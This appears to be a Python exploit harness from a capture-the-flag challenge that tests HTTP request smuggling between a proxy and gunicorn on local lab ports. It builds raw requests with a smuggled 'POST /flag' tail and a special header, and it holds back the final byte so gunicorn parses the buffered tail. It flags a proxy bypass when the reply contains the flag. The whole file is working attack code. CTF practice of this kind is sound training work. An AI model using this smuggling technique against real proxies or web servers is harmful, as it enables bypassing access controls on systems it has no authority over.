#!/usr/bin/env python3
"""
Framing-differential matrix against the local labs.

Delivery matters. gunicorn 26.2.0 (gthread) buffers pipelined bytes but its
keep-alive loop waits for the socket to become readable before it will parse
what is already in the buffer. So send everything except the final byte, read,
then send the final byte. Without that the smuggled tail is never processed.

Oracle: the smuggled tail is `POST /flag` + `brevski: george`.
  proxy reply contains TFCCTF{ -> proxoxy treated the tail as opaque body and
  gunicorn parsed it as a request. That's the bypass.
"""
import socket
import sys
import time

PROXY, DIRECT = 38888, 38900
REALPROXY, REALDIRECT = 28888, 28900
H = "127.0.0.1"

TAIL = b"POST /flag HTTP/1.1\r\nHost: x\r\nbrevski: george\r\nContent-Length: 0\r\n\r\n"


def deliver(host, port, blob, hold=1, wait=0.7, read=2.5):
    """Send blob minus the last `hold` bytes, drain, send the rest, drain."""
    s = socket.create_connection((host, port), timeout=8)
    out = b""
    try:
        s.sendall(blob[:-hold] if hold else blob)
        time.sleep(wait)
        s.settimeout(read)
        try:
            while True:
                d = s.recv(65536)
                if not d:
                    return out
                out += d
        except socket.timeout:
            pass
        if hold:
            s.sendall(blob[-hold:])
            time.sleep(wait)
            s.settimeout(read)
            try:
                while True:
                    d = s.recv(65536)
                    if not d:
                        break
                    out += d
            except socket.timeout:
                pass
    except Exception as e:
        out += b"<ERR %r>" % (e,)
    finally:
        s.close()
    return out


def run(name, payload, proxy=PROXY, direct=DIRECT, hold=1):
    rp = deliver(H, proxy, payload, hold=hold)
    rd = deliver(H, direct, payload, hold=hold)
    fp = b"TFCCTF{" in rp
    fd = b"TFCCTF{" in rd
    sp = rp.split(b"\r\n", 1)[0].decode(errors="replace") if rp else "<DROPPED>"
    mark = "   *** BYPASS ***" if fp else ""
    print(f"{name:46s} proxy={sp:26s} nresp={rp.count(b'HTTP/1.1 ')} "
          f"gunicorn_smuggles={'Y' if fd else 'n'}{mark}")
    return rp, rd


def req(headers, body=b"", method=b"POST", path=b"/echo", ver=b"HTTP/1.1", host=b"x"):
    h = b"".join(k + b": " + v + b"\r\n" for k, v in headers)
    return method + b" " + path + b" " + ver + b"\r\nHost: " + host + b"\r\n" + h + b"\r\n" + body
